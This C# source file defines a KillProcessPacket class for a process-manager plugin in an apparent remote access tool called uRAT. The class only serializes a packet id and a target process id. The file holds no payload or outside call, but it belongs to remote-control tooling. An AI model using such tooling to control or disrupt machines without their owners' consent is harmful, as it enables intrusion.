using System.IO;
using uNet2.Packet;

namespace uRAT.ManagersPlugin.ProcessManager.Packets
{
    public class KillProcessPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 6; }
        }

        public int Pid { get; set; }

        public KillProcessPacket()
        {
        }

        public KillProcessPacket(int pid)
        {
            Pid = pid;
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(Pid);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            br.ReadInt32();
            Pid = br.ReadInt32();
        }
    }
}
